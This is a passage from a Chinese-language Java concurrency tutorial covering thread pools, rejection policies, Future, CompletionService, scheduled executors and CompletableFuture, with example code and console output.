ForkJoinWorkerThreadFactory  factory
UncaughtExceptionHandler handler
boolean asyncMode




newWorkStealingPool()
Runtime.getRuntime().availableProcessors()
ForkJoinPool.defaultForkJoinWorkerThreadFactory
null
TRUE


newWorkStealingPool(int  parallelism)
parallelism
ForkJoinPool.defaultForkJoinWorkerThreadFactory
null
TRUE



package hots.utils.executor;import java.util.List;import java.util.concurrent.Callable;import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;import java.util.concurrent.TimeUnit;import java.util.stream.Collectors;import java.util.stream.IntStream;public class ExecutorsExample {    public static void main(String[] args) throws InterruptedException {        ExecutorService executorService = Executors.newWorkStealingPool();        List&lt;Future&lt;String&gt;&gt; futures = executorService.invokeAll(getTasks());        executorService.shutdown();    }    static List&lt;Callable&lt;String&gt;&gt; getTasks() {        return IntStream.rangeClosed(0, 20).boxed().map(i -&gt; {            Callable&lt;String&gt; stringCallable = () -&gt; {                System.out.println(Thread.currentThread().getName());                doAction(1);                return "Task:" + i;            };            return stringCallable;        }).collect(Collectors.toList());    }    private static void doAction(int seconds) {        try {            TimeUnit.SECONDS.sleep(seconds);        } catch (InterruptedException e) {            throw new RuntimeException(e);        }    }}
ThreadPoolExecutor
四个内置拒绝策略

继承自RejectedExecutionHandler





策略
说明




AbortPolicy
抛出RejectedExecutionException异常


DiscardPolicy
默默地丢弃被拒绝的任务


DiscardOldestPolicy
丢弃最早的未处理请求，然后重试执行请求任务。若任务已被关闭，则丢弃任务


CallerRunsPolicy
直接在执行方法的调用线程中运行被拒绝的任务。若任务已被关闭，则丢弃任务



自定义ThreadFactory
import lombok.Data;import java.util.ArrayList;import java.util.List;import java.util.concurrent.ThreadFactory;import java.util.concurrent.atomic.AtomicInteger;@Datapublic class MyThreadFactory implements ThreadFactory {    private AtomicInteger SEQ = new AtomicInteger();    private List&lt;FailedAction&gt; failed = new ArrayList&lt;&gt;();    @Override    public Thread newThread(Runnable r) {        Thread thread = new Thread(r);        thread.setName("Factory-" + SEQ.getAndIncrement());        thread.setUncaughtExceptionHandler((t, e) -&gt; {            // 保留异常信息            failed.add(new FailedAction(t, e));        });        return thread;    }    @Data    static class FailedAction {        private Thread thread;        private Throwable throwable;        FailedAction(Thread t, Throwable e) {            this.thread = t;            this.throwable = e;        }    }}
import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;public class MyThreadFactoryTest {    public static void main(String[] args) {        MyThreadFactory myThreadFactory = new MyThreadFactory();        ExecutorService executorService = Executors.newFixedThreadPool(1, myThreadFactory);        executorService.execute(() -&gt; System.out.println(1 / 0));        myThreadFactory.getFailed().stream().map(e -&gt; e.getThrowable()).forEach(e -&gt; e.printStackTrace());        executorService.shutdown();    }}
允许回收执行线程：allowCoreThreadTimeOut
private volatile boolean allowCoreThreadTimeOut;
public class AllowCoreThreadTimeOutTest {    public static void main(String[] args) {        ThreadPoolExecutor executorService = (ThreadPoolExecutor) Executors.newFixedThreadPool(2);        executorService.setKeepAliveTime(10, TimeUnit.SECONDS);        executorService.submit(() -&gt; System.out.println(Thread.currentThread().getName()));        executorService.allowCoreThreadTimeOut(true);    }}# 10秒后线程池被销毁，测试进程退出
public class AllowCoreThreadTimeOutTest {    public static void main(String[] args) {        ThreadPoolExecutor executorService = (ThreadPoolExecutor) Executors.newFixedThreadPool(2);        executorService.setKeepAliveTime(10, TimeUnit.SECONDS);        executorService.submit(() -&gt; System.out.println(Thread.currentThread().getName()));        executorService.allowCoreThreadTimeOut(false);    }}# 测试进程无法退出，executorService保有2个活跃的执行线程
删除任务：remove
适用于executorService.execute(e) 提交的任务，而executorService.submit(e) 提交的任务，无法移除。submit 提交的任务
public class RemoveTest {    public static void main(String[] args) {        ThreadPoolExecutor executorService = new ThreadPoolExecutor(2, 2, 0, TimeUnit.SECONDS,                new ArrayBlockingQueue&lt;&gt;(2));        List&lt;Runnable&gt; runnableList = IntStream.rangeClosed(0, 3).boxed().map(i -&gt; (Runnable) () -&gt; {                    sleep(5);                    System.out.println("task:" + i + " with " + Thread.currentThread().getName());                }        ).collect(Collectors.toList());        runnableList.stream().forEach(e -&gt; executorService.execute(e));        sleep(1);        boolean result = executorService.remove(runnableList.get(2));        System.out.println("remove result : " + result);        sleep(6);        executorService.shutdown();    }    private static void sleep(int seconds) {        try {            TimeUnit.SECONDS.sleep(seconds);        } catch (Exception e) {            e.printStackTrace();        }    }}
prestartCoreThread ： 启动一个执行线程
prestartAllCoreThreads：启动所有执行线程
beforeExecute/afterExecute
自定义ThreadPoolExecutor的子类，覆写。
Future与FutureTask
Future 接口



接口方法




V get() throws InterruptedException, ExecutionException;


V get(long timeout, TimeUnit unit)     throws InterruptedException, ExecutionException, TimeoutException;


boolean isDone();


boolean cancel(boolean mayInterruptIfRunning);


boolean isCancelled();




cancel：取消任务，如果取消任务成功则返回true，如果取消任务失败则返回false。参数mayInterruptIfRunning表示是否允许取消正在执行却没有执行完毕的任务：

如果设置true，则表示可以取消正在执行过程中的任务
如果任务已经完成，则无论mayInterruptIfRunning为true还是false，此方法肯定返回false
如果任务正在执行，若mayInterruptIfRunning设置为true，则返回true，若mayInterruptIfRunning设置为false，则返回false
如果任务还没有执行，则无论mayInterruptIfRunning为true还是false，肯定返回true


isCancelled：方法表示任务是否被取消成功，如果在任务正常完成前被取消成功，则返回 true
isDone：判断任务是否已经完成，已完成则返回true；
get()：获取执行结果，这个方法会产生阻塞，会一直等到任务执行完毕才返回；
 get(long timeout, TimeUnit unit)：用来获取执行结果，如果在指定时间内，还没获取到结果，就直接返回null

import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;import java.util.concurrent.Future;import java.util.concurrent.TimeUnit;/** * boolean cancel(boolean mayInterruptIfRunning); */public class FutureExample {    public static void main(String[] args) throws InterruptedException {        ExecutorService executorService = Executors.newSingleThreadExecutor();        Future&lt;String&gt; result = executorService.submit(() -&gt; {            while (!Thread.currentThread().isInterrupted()) {            }            return "done";        });        sleep(1);        System.out.println(result.cancel(true));        executorService.shutdown();        System.out.println("all done");    }    private static void sleep(int seconds) {        try {            TimeUnit.SECONDS.sleep(seconds);        } catch (Exception e) {            e.printStackTrace();        }    }}
FutureTask类
FutureTask类实现了RunnableFuture接口，RunnableFuture接口又继承了Runable和Future，可见，FutureTask既可以作为Runnable被线程执行，又可以作为Future得到Callable的返回值。
FutureTask类图如下

FutureTask两个构造函数：
FutureTask(Callable&lt;V&gt; callable);FutureTask(Runnable runnable, V result);
使用FutureTask来实现Future多线程获取任务结果的场景
import java.util.Date;import java.util.concurrent.*;public class FutureTaskTest {    public static void main(String[] args) {        ExecutorService executor = Executors.newCachedThreadPool();        for (int i = 0; i &lt; 3; i++) {            Callable&lt;String&gt; callable = new Task(8 - i);            MyFutureTask task = new MyFutureTask(callable);            executor.submit(task);        }        executor.shutdown();    }}class MyFutureTask extends FutureTask&lt;String&gt; {    public MyFutureTask(Callable&lt;String&gt; callable) {        super(callable);    }    @Override    protected void done() {        try {            System.out.println(get() + "完成：" + new Date());        } catch (InterruptedException | ExecutionException e) {            e.printStackTrace();        }    }}class Task implements Callable&lt;String&gt; {    private int time;    public Task(int time) {        this.time = time;    }    @Override    public String call() throws InterruptedException {        String name = Thread.currentThread().getName();        System.out.println(name + "启动：" + new Date());        TimeUnit.SECONDS.sleep(time);        return name;    }}
输出结果：
pool-1-thread-1启动：Fri Nov 08 17:35:26 CST 2019pool-1-thread-3启动：Fri Nov 08 17:35:26 CST 2019pool-1-thread-2启动：Fri Nov 08 17:35:26 CST 2019pool-1-thread-3完成：Fri Nov 08 17:35:32 CST 2019pool-1-thread-2完成：Fri Nov 08 17:35:33 CST 2019pool-1-thread-1完成：Fri Nov 08 17:35:34 CST 2019
CompletionService接口
我们知道，通过 Future 和 FutureTask 可以获得线程任务的执行结果，但它们有一定的缺陷：

Future：多个线程任务的执行结果，我们可以通过轮询的方式去获取，但普通轮询会有被阻塞的可能，升级轮询会非常消耗cpu
FutureTask：虽然我们可以调用 done 方法，在线程任务执行结束后立即返回或做其他处理，但对批量线程任务结果的管理方面有所不足

为了更好地应对大量线程任务结果处理的问题，JDK提供了功能强大的 CompletionService。CompletionService是一个接口，使用创建时提供的 Executor 对象（通常是线程池）来执行任务，并在内部维护了一个阻塞队列QueueingFuture，当任务执行结束就把任务的执行结果的Future对象加入到阻塞队列中。
该接口只有一个实现类： ExecutorCompletionService

ExecutorCompletionService  的构造函数

/** * Creates an ExecutorCompletionService using the supplied * executor for base task execution and a * {@link LinkedBlockingQueue} as a completion queue. * * @param executor the executor to use * @throws NullPointerException if executor is {@code null} */public ExecutorCompletionService(Executor executor) {	if (executor == null)		throw new NullPointerException();	this.executor = executor;	this.aes = (executor instanceof AbstractExecutorService) ?		(AbstractExecutorService) executor : null;	this.completionQueue = new LinkedBlockingQueue&lt;Future&lt;V&gt;&gt;();}/** * Creates an ExecutorCompletionService using the supplied * executor for base task execution and the supplied queue as its * completion queue. * * @param executor the executor to use * @param completionQueue the queue to use as the completion queue *        normally one dedicated for use by this service. This *        queue is treated as unbounded -- failed attempted *        {@code Queue.add} operations for completed tasks cause *        them not to be retrievable. * @throws NullPointerException if executor or completionQueue are {@code null} */public ExecutorCompletionService(Executor executor,								 BlockingQueue&lt;Future&lt;V&gt;&gt; completionQueue) {	if (executor == null || completionQueue == null)		throw new NullPointerException();	this.executor = executor;	this.aes = (executor instanceof AbstractExecutorService) ?		(AbstractExecutorService) executor : null;	this.completionQueue = completionQueue;}
这两个构造方法都需要传入一个线程池，如果不指定 completionQueue，那么默认会使用无界的 LinkedBlockingQueue。任务执行结果的 Future 对象就是加入到 completionQueue 中。

CompletionService 接口方法

public interface CompletionService&lt;V&gt; {    //提交线程任务    Future&lt;V&gt; submit(Callable&lt;V&gt; task);    //提交线程任务    Future&lt;V&gt; submit(Runnable task, V result);    //阻塞等待    Future&lt;V&gt; take() throws InterruptedException;    //非阻塞等待    Future&lt;V&gt; poll();    //带时间的非阻塞等待    Future&lt;V&gt; poll(long timeout, TimeUnit unit) throws InterruptedException;}

submit(Callable task)：提交线程任务，交由 Executor 对象去执行，并将结果放入阻塞队列；
take()：在阻塞队列中获取并移除一个元素，该方法是阻塞的，即获取不到的话线程会一直阻塞；
poll()：在阻塞队列中获取并移除一个元素，该方法是非阻塞的，获取不到即返回 null ；
poll(long timeout, TimeUnit unit)：从阻塞队列中非阻塞地获取并移除一个元素，在设置的超时时间内获取不到即返回 null ；

接下来，我们重点看一下submit 的源码：
public Future&lt;V&gt; submit(Callable&lt;V&gt; task) {   if (task == null) throw new NullPointerException();   RunnableFuture&lt;V&gt; f = newTaskFor(task);   executor.execute(new QueueingFuture(f));   return f;}
从submit 方法的源码中可以确认两点：

线程任务确实是由 Executor 对象执行的；
提交某个任务时，该任务首先将被包装为一个QueueingFuture。

继续追查 QueueingFuture，可以发现： 该类重写了 FutureTask 的done方法，当计算完成时，把Executor执行的计算结果放入BlockingQueue中，而==放入结果是按任务完成顺序来进行==的，即先完成的任务先放入阻塞队列。
 /**   * FutureTask extension to enqueue upon completion   */  private class QueueingFuture extends FutureTask&lt;Void&gt; {      QueueingFuture(RunnableFuture&lt;V&gt; task) {          super(task, null);          this.task = task;      }      protected void done() { completionQueue.add(task); }      private final Future&lt;V&gt; task;  }  
由此，CompletionService 实现了生产者提交任务和消费者获取结果的解耦，任务的完成顺序由 CompletionService 来保证，消费者一定是按照任务完成的先后顺序来获取执行结果。

CompletionService 使用示例

import java.util.Date;import java.util.concurrent.*;public class CompletionServiceTest {    public static void main(String[] args) {        ExecutorService executor = Executors.newCachedThreadPool();        CompletionService&lt;String&gt; cs = new ExecutorCompletionService&lt;&gt;(executor);        // 此线程池运行5个线程        for (int i = 0; i &lt; 5; i++) {            final int index = i;            cs.submit(() -&gt; {                String name = Thread.currentThread().getName();                System.out.println(name + " 启动：" + new Date());                TimeUnit.SECONDS.sleep(10 - index * 2);                return name;            });        }        executor.shutdown();        for (int i = 0; i &lt; 5; i++) {            try {                System.out.println(cs.take().get() + " 结果：" + new Date());            } catch (Exception e) {                e.printStackTrace();            }        }    }}
pool-1-thread-2 启动：Sun Nov 10 11:34:13 CST 2019pool-1-thread-4 启动：Sun Nov 10 11:34:13 CST 2019pool-1-thread-3 启动：Sun Nov 10 11:34:13 CST 2019pool-1-thread-5 启动：Sun Nov 10 11:34:13 CST 2019pool-1-thread-1 启动：Sun Nov 10 11:34:13 CST 2019pool-1-thread-5 结果：Sun Nov 10 11:34:15 CST 2019pool-1-thread-4 结果：Sun Nov 10 11:34:17 CST 2019pool-1-thread-3 结果：Sun Nov 10 11:34:19 CST 2019pool-1-thread-2 结果：Sun Nov 10 11:34:21 CST 2019pool-1-thread-1 结果：Sun Nov 10 11:34:23 CST 2019
ScheduledExecutorService

/*** 1秒后开始执行任务，每2秒执行一回*/public class ScheduledExecutorServiceTest {    public static void main(String[] args) {        ScheduledExecutorService scheduledExecutorService = Executors.newScheduledThreadPool(2);        //scheduledExecutorService.schedule(() -&gt; System.out.println(Thread.currentThread().getName()), 1, TimeUnit.SECONDS);        AtomicLong time = new AtomicLong(-1);        scheduledExecutorService.scheduleAtFixedRate(() -&gt; {            sleep(5);            if (time.get() &gt; 0) {                System.out.println(Thread.currentThread().getName() + ": " + (System.currentTimeMillis() - time.get()));            }            time.set(System.currentTimeMillis());        }, 1, 2, TimeUnit.SECONDS);    }    private static void sleep(int time) {        try {            TimeUnit.SECONDS.sleep(time);        } catch (Exception e) {        }    }}
pool-1-thread-1: 5001pool-1-thread-1: 5001pool-1-thread-1: 5000pool-1-thread-2: 5001pool-1-thread-2: 5000pool-1-thread-2: 5001pool-1-thread-2: 5001pool-1-thread-2: 5000pool-1-thread-1: 5001pool-1-thread-1: 5000...

ScheduledThreadPoolExecutor 特殊参数说明

/** * 允许现有周期性任务在Shutdown之后继续执行 */private volatile boolean continueExistingPeriodicTasksAfterShutdown;/** * 允许现有延时任务在Shutdown之后继续执行 */private volatile boolean executeExistingDelayedTasksAfterShutdown = true;
public class ScheduledExecutorServiceTest {    public static void main(String[] args) {        ScheduledThreadPoolExecutor scheduledThreadPool = (ScheduledThreadPoolExecutor) Executors.newScheduledThreadPool(2);        scheduledThreadPool.setExecuteExistingDelayedTasksAfterShutdownPolicy(false);        //scheduledThreadPool.setContinueExistingPeriodicTasksAfterShutdownPolicy(true);        final AtomicLong time = new AtomicLong(-1);        scheduledThreadPool.scheduleAtFixedRate(() -&gt; {            sleep(3);            if (time.get() &gt; 0) {                System.out.println(Thread.currentThread().getName() + ": " + (System.currentTimeMillis() - time.get()));            }            time.set(System.currentTimeMillis());        }, 1, 2, TimeUnit.SECONDS);        scheduledThreadPool.shutdown();    }    private static void sleep(int time) {        try {            TimeUnit.SECONDS.sleep(time);        } catch (Exception e) {        }    }}
CompletableFuture
创建对象
runAsync
public static CompletableFuture&lt;Void&gt; runAsync(Runnable runnable)public static CompletableFuture&lt;Void&gt; runAsync(Runnable runnable, Executor executor)
supplyAsync
public static &lt;U&gt; CompletableFuture&lt;U&gt; supplyAsync(Supplier&lt;U&gt; supplier)public static &lt;U&gt; CompletableFuture&lt;U&gt; supplyAsync(Supplier&lt;U&gt; supplier, Executor executor)
runAsync 方法以Runnable函数式接口类型为参数，没有返回结果，
supplyAsync 方法Supplier函数式接口类型为参数，返回结果类型为U；
没有指定Executor的方法会使用ForkJoinPool.commonPool() 作为它的线程池执行异步代码。如果指定线程池，则使用指定的线程池运行
结果处理

当CompletableFuture的计算结果完成，或者抛出异常的时候，我们可以执行特定的 Action

whenComplete
public CompletableFuture&lt;T&gt; whenComplete(BiConsumer&lt;? super T,? super Throwable&gt; action)public CompletableFuture&lt;T&gt; whenCompleteAsync(BiConsumer&lt;? super T,? super Throwable&gt; action)public CompletableFuture&lt;T&gt; whenCompleteAsync(BiConsumer&lt;? super T,? super Throwable&gt; action, Executor executor)
exceptionally
public CompletableFuture&lt;T&gt; exceptionally(Function&lt;Throwable,? extends T&gt; fn)

Action的类型是BiConsumer&lt;? super T,? super Throwable&gt;，它可以处理正常的计算结果，或者异常情况。
方法不以Async结尾，意味着Action使用相同的线程执行，而Async可能会使用其它的线程去执行(如果使用相同的线程池，也可能会被同一个线程选中执行。
这几个方法都会返回CompletableFuture。当Action执行完毕后，返回原始的CompletableFuture的计算结果或者返回异常。

public class CompletableFutureExample2 {    public static void main(String[] args) {        CompletableFuture&lt;Void&gt; future = CompletableFuture.runAsync(() -&gt; {            sleep(1);            int data = ThreadLocalRandom.current().nextInt(20);            if (data % 2 == 0) {                System.out.println(Thread.currentThread().getName() + "：数据-" + data);                int i = 12 / 0;            }            System.out.println(Thread.currentThread().getName() + "：执行结束");        });        future.whenComplete(new BiConsumer&lt;Void, Throwable&gt;() {            @Override            public void accept(Void t, Throwable action) {                System.out.println(Thread.currentThread().getName() + "：执行完成");            }        });        future.exceptionally(new Function&lt;Throwable, Void&gt;() {            @Override            public Void apply(Throwable t) {                System.out.println(Thread.currentThread().getName() + "：执行失败，" + t.getMessage());                return null;            }        }).join();    }    private static void sleep(int seconds) {        try {            TimeUnit.SECONDS.sleep(seconds);        } catch (Exception e) {            e.printStackTrace();        }    }}
正常执行结束
ForkJoinPool.commonPool-worker-1：执行结束ForkJoinPool.commonPool-worker-1：执行完成
抛出异常
ForkJoinPool.commonPool-worker-1：数据-6ForkJoinPool.commonPool-worker-1：执行失败，java.lang.ArithmeticException: / by zeroForkJoinPool.commonPool-worker-1：执行完成
handle

当原先的CompletableFuture的值计算完成或者抛出异常的时候，由BiFunction参数计算，产生新的CompletableFuture

这组方法兼有whenComplete和转换的两个功能（whenComplete and reture）
public &lt;U&gt; CompletableFuture&lt;U&gt; handle(BiFunction&lt;? super T,Throwable,? extends U&gt; fn)public &lt;U&gt; CompletableFuture&lt;U&gt; handleAsync(BiFunction&lt;? super T,Throwable,? extends U&gt; fn)public &lt;U&gt; CompletableFuture&lt;U&gt; handleAsync(BiFunction&lt;? super T,Throwable,? extends U&gt; fn, Executor executor)
测试DEMO：
public static void main(String[] args) throws ExecutionException, InterruptedException {	CompletableFuture&lt;Integer&gt; future = CompletableFuture.supplyAsync(() -&gt; {		int result = 100;		System.out.println("一阶段：" + result);		return result;	}).handle((number, exception) -&gt; {		int result = number * 3;		System.out.println("二阶段：" + result);		return result;	});	System.out.println("最终结果：" + future.get());}
一阶段：100二阶段：300最终结果：300
结果转换（Function）
所谓结果转换，就是将上一段任务的执行结果作为下一阶段任务的入参参与重新计算，产生新的结果
thenApply


thenApply 接收一个函数作为参数，使用该函数处理上一个CompletableFuture 调用的结果，并返回一个具有处理结果的Future对象。
public &lt;U&gt; CompletableFuture&lt;U&gt; thenApply(Function&lt;? super T,? extends U&gt; fn)public &lt;U&gt; CompletableFuture&lt;U&gt; thenApplyAsync(Function&lt;? super T,? extends U&gt; fn)public &lt;U&gt; CompletableFuture&lt;U&gt; thenApplyAsync(Function&lt;? super T,? extends U&gt; fn, Executor executor)
示例：
public static void main(String[] args) throws ExecutionException, InterruptedException {    CompletableFuture&lt;Integer&gt; future = CompletableFuture.supplyAsync(() -&gt; {    int result = 100;    System.out.println("一阶段：" + result);        return result;    }).thenApply(number -&gt; {        int result = number * 3;        System.out.println("二阶段：" + result);        return result;    });    System.out.println("最终结果：" + future.get());}
一阶段：100二阶段：300最终结果：300


thenCompose


thenCompose的参数为一个返回 CompletableFuture 实例的函数，该函数的参数是先前计算步骤的结果。
public &lt;U&gt; CompletableFuture&lt;U&gt; thenCompose(Function&lt;? super T, ? extends CompletionStage&lt;U&gt;&gt; fn);public &lt;U&gt; CompletableFuture&lt;U&gt; thenComposeAsync(Function&lt;? super T, ? extends CompletionStage&lt;U&gt;&gt; fn) ;public &lt;U&gt; CompletableFuture&lt;U&gt; thenComposeAsync(Function&lt;? super T, ? extends CompletionStage&lt;U&gt;&gt; fn, Executor executor) ;
示例
public static void main(String[] args) throws InterruptedException, ExecutionException {    CompletableFuture&lt;Integer&gt; future = CompletableFuture.supplyAsync(new Supplier&lt;Integer&gt;() {        @Override        public Integer get() {            int number = new Random().nextInt(3);            System.out.println("第一阶段：" + number);            return number;        }    }).thenCompose(new Function&lt;Integer, CompletionStage&lt;Integer&gt;&gt;() {        @Override        public CompletionStage&lt;Integer&gt; apply(Integer param) {            return CompletableFuture.supplyAsync(new Supplier&lt;Integer&gt;() {                @Override                public Integer get() {                    int number = param * 2;                    System.out.println("第二阶段：" + number);                    return number;                }            });        }    });    System.out.println("最终结果: " + future.get());}
那么 thenApply 和thenCompose 有何区别呢：

thenApply 转换的是泛型中的类型，返回的是同一个CompletableFuture；
thenCompose 使用上一个CompletableFutre 调用的结果在下一步的 CompletableFuture 调用中进行运算，是生成一个内部构造的新的CompletableFuture。

下面用一个例子对对比：
public static void main(String[] args) throws InterruptedException, ExecutionException {    CompletableFuture&lt;String&gt; future = CompletableFuture.supplyAsync(() -&gt; "Hello");    CompletableFuture&lt;String&gt; result1 = future.thenApply(param -&gt; param + " World");    CompletableFuture&lt;String&gt; result2 = future.thenCompose(param -&gt; CompletableFuture.supplyAsync(() -&gt; param + " World"));    System.out.println(result1.get());    System.out.println(result2.get());}


结果消费（Consumer）
与结果处理和结果转换系列函数返回一个新的 CompletableFuture 不同，结果消费系列函数只对结果执行Action，而不返回新的计算值。
根据对结果的处理方式，结果消费函数又分为：

thenAccept系列：对单个结果进行消费
thenAcceptBoth系列：对两个结果进行消费
thenRun系列：不关心结果，只对结果执行Action

thenAccept
通过观察该系列函数的参数类型可知，它们是函数式接口Consumer，这个接口只有输入，没有返回值。
public CompletionStage&lt;Void&gt; thenAccept(Consumer&lt;? super T&gt; action);public CompletionStage&lt;Void&gt; thenAcceptAsync(Consumer&lt;? super T&gt; action);public CompletionStage&lt;Void&gt; thenAcceptAsync(Consumer&lt;? super T&gt; action,Executor executor);
示例
public static void main(String[] args) throws ExecutionException, InterruptedException {    CompletableFuture&lt;Void&gt; future = CompletableFuture.supplyAsync(() -&gt; {        int number = new Random().nextInt(10);        System.out.println("第一阶段：" + number);        return number;    }).thenAccept(number -&gt; System.out.println("第二阶段：" + number * 5));    System.out.println("最终结果：" + future.get());}
thenAcceptBoth
thenAcceptBoth 函数的作用是，当两个 CompletionStage 都正常完成计算的时候，就会执行提供的action，消费两个异步的结果。没有返回值。
public &lt;U&gt; CompletionStage&lt;Void&gt; thenAcceptBoth(CompletionStage&lt;? extends U&gt; other,BiConsumer&lt;? super T, ? super U&gt; action);public &lt;U&gt; CompletionStage&lt;Void&gt; thenAcceptBothAsync(CompletionStage&lt;? extends U&gt; other,BiConsumer&lt;? super T, ? super U&gt; action);public &lt;U&gt; CompletionStage&lt;Void&gt; thenAcceptBothAsync(CompletionStage&lt;? extends U&gt; other,BiConsumer&lt;? super T, ? super U&gt; action, Executor executor);
示例
public static void main(String[] args) throws ExecutionException, InterruptedException {    CompletableFuture&lt;Integer&gt; futrue1 = CompletableFuture.supplyAsync(new Supplier&lt;Integer&gt;() {        @Override        public Integer get() {            int number = new Random().nextInt(3) + 1;            try {                TimeUnit.SECONDS.sleep(number);            } catch (InterruptedException e) {                e.printStackTrace();            }            System.out.println("第一阶段：" + number);            return number;        }    });    CompletableFuture&lt;Integer&gt; future2 = CompletableFuture.supplyAsync(new Supplier&lt;Integer&gt;() {        @Override        public Integer get() {            int number = new Random().nextInt(3) + 1;            try {                TimeUnit.SECONDS.sleep(number);            } catch (InterruptedException e) {                e.printStackTrace();            }            System.out.println("第二阶段：" + number);            return number;        }    });    futrue1.thenAcceptBoth(future2, new BiConsumer&lt;Integer, Integer&gt;() {        @Override        public void accept(Integer x, Integer y) {            System.out.println("最终结果：" + (x + y));        }    }).join();}
thenRun
thenRun 也是对线程任务结果的一种消费函数，与thenAccept不同的是，thenRun 会在上一阶段 CompletableFuture 计算完成的时候执行一个Runnable，但是不使用该 CompletableFuture 计算的结果。
public CompletionStage&lt;Void&gt; thenRun(Runnable action);public CompletionStage&lt;Void&gt; thenRunAsync(Runnable action);public CompletionStage&lt;Void&gt; thenRunAsync(Runnable action,Executor executor);
示例
public static void main(String[] args) throws ExecutionException, InterruptedException {    CompletableFuture&lt;Void&gt; future = CompletableFuture.supplyAsync(() -&gt; {        int number = new Random().nextInt(10);        System.out.println("第一阶段：" + number);        return number;    }).thenRun(() -&gt; System.out.println("thenRun 执行"));    System.out.println("最终结果：" + future.get());}
结果组合
thenCombine
thenCombine 方法，合并两个线程任务的结果，并进一步处理。
public &lt;U,V&gt; CompletionStage&lt;V&gt; thenCombine(CompletionStage&lt;? extends U&gt; other, BiFunction&lt;? super T,? super U,? extends V&gt; fn);public &lt;U,V&gt; CompletionStage&lt;V&gt; thenCombineAsync(CompletionStage&lt;? extends U&gt; other, BiFunction&lt;? super T,? super U,? extends V&gt; fn);public &lt;U,V&gt; CompletionStage&lt;V&gt; thenCombineAsync(CompletionStage&lt;? extends U&gt; other, BiFunction&lt;? super T,? super U,? extends V&gt; fn,Executor executor);
示例
public static void main(String[] args) throws ExecutionException, InterruptedException {    CompletableFuture&lt;Integer&gt; future1 = CompletableFuture.supplyAsync(new Supplier&lt;Integer&gt;() {        @Override        public Integer get() {            int number = new Random().nextInt(10);            System.out.println("第一阶段：" + number);            return number;        }    });      CompletableFuture&lt;Integer&gt; future2 = CompletableFuture.supplyAsync(new Supplier&lt;Integer&gt;() {        @Override        public Integer get() {            int number = new Random().nextInt(10);            System.out.println("第二阶段：" + number);            return number;        }    });      CompletableFuture&lt;Integer&gt; result = future1.thenCombine(future2, new BiFunction&lt;Integer, Integer, Integer&gt;() {        @Override        public Integer apply(Integer x, Integer y) {            return x + y;        }    });    System.out.println("最终结果：" + result.get());}
任务交互
线程交互，是指将两个线程任务获取结果的速度相比较，按一定的规则进行下一步处理。
applyToEither（转换）
两个线程任务相比较，先获得执行结果的，就对该结果进行下一步的转换操作。
public &lt;U&gt; CompletionStage&lt;U&gt; applyToEither(CompletionStage&lt;? extends T&gt; other,Function&lt;? super T, U&gt; fn);public &lt;U&gt; CompletionStage&lt;U&gt; applyToEitherAsync(CompletionStage&lt;? extends T&gt; other,Function&lt;? super T, U&gt; fn);public &lt;U&gt; CompletionStage&lt;U&gt; applyToEitherAsync(CompletionStage&lt;? extends T&gt; other,Function&lt;? super T, U&gt; fn,Executor executor);
示例
public static void main(String[] args) throws ExecutionException, InterruptedException {    CompletableFuture&lt;Integer&gt; future1 = CompletableFuture.supplyAsync(new Supplier&lt;Integer&gt;() {        @Override        public Integer get() {            int number = new Random().nextInt(3);            try {                TimeUnit.SECONDS.sleep(number);            } catch (InterruptedException e) {                e.printStackTrace();            }            System.out.println("第一阶段：" + number);            return number;        }    });    CompletableFuture&lt;Integer&gt; future2 = CompletableFuture.supplyAsync(new Supplier&lt;Integer&gt;() {        @Override        public Integer get() {            int number = new Random().nextInt(3);            try {                TimeUnit.SECONDS.sleep(number);            } catch (InterruptedException e) {                e.printStackTrace();            }            System.out.println("第二阶段：" + number);            return number;        }    });    future1.applyToEither(future2, new Function&lt;Integer, Integer&gt;() {        @Override        public Integer apply(Integer number) {            System.out.println("最快结果：" + number);            return number * 2;        }    }).join();}
acceptEither（消费）
两个线程任务相比较，先获得执行结果的，就对该结果进行下一步的消费操作。
public CompletionStage&lt;Void&gt; acceptEither(CompletionStage&lt;? extends T&gt; other,Consumer&lt;? super T&gt; action);public CompletionStage&lt;Void&gt; acceptEitherAsync(CompletionStage&lt;? extends T&gt; other,Consumer&lt;? super T&gt; action);public CompletionStage&lt;Void&gt; acceptEitherAsync(CompletionStage&lt;? extends T&gt; other,Consumer&lt;? super T&gt; action,Executor executor);
示例
public static void main(String[] args) {    CompletableFuture&lt;Integer&gt; future1 = CompletableFuture.supplyAsync(new Supplier&lt;Integer&gt;() {        @Override        public Integer get() {            int number = new Random().nextInt(3) + 1;            try {                TimeUnit.SECONDS.sleep(number);            } catch (InterruptedException e) {                e.printStackTrace();            }            System.out.println("第一阶段：" + number);            return number;        }    });    CompletableFuture&lt;Integer&gt; future2 = CompletableFuture.supplyAsync(new Supplier&lt;Integer&gt;() {        @Override        public Integer get() {            int number = new Random().nextInt(3) + 1;            try {                TimeUnit.SECONDS.sleep(number);            } catch (InterruptedException e) {                e.printStackTrace();            }            System.out.println("第二阶段：" + number);            return number;        }    });    future1.acceptEither(future2, new Consumer&lt;Integer&gt;() {        @Override        public void accept(Integer number) {            System.out.println("最快结果：" + number);        }    }).join();}
runAfterEither
两个线程任务相比较，有任何一个执行完成，就进行下一步操作，不关心运行结果。
public CompletionStage&lt;Void&gt; runAfterEither(CompletionStage&lt;?&gt; other,Runnable action);public CompletionStage&lt;Void&gt; runAfterEitherAsync(CompletionStage&lt;?&gt; other,Runnable action);public CompletionStage&lt;Void&gt; runAfterEitherAsync(CompletionStage&lt;?&gt; other,Runnable action,Executor executor);
示例
import java.util.Random;import java.util.concurrent.CompletableFuture;import java.util.concurrent.TimeUnit;import java.util.function.Supplier;public class CompletableFutureTest {    public static void main(String[] args) {        CompletableFuture&lt;Integer&gt; future1 = CompletableFuture.supplyAsync(new Supplier&lt;Integer&gt;() {            @Override            public Integer get() {                int number = new Random().nextInt(5);                try {                    TimeUnit.SECONDS.sleep(number);                } catch (InterruptedException e) {                    e.printStackTrace();                }                System.out.println("第一阶段：" + number);                return number;            }        });        CompletableFuture&lt;Integer&gt; future2 = CompletableFuture.supplyAsync(new Supplier&lt;Integer&gt;() {            @Override            public Integer get() {                int number = new Random().nextInt(5);                try {                    TimeUnit.SECONDS.sleep(number);                } catch (InterruptedException e) {                    e.printStackTrace();                }                System.out.println("第二阶段：" + number);                return number;            }        });        future1.runAfterEither(future2, new Runnable() {            @Override            public void run() {                System.out.println("已经有一个任务完成了");            }        }).join();    }}
runAfterBoth
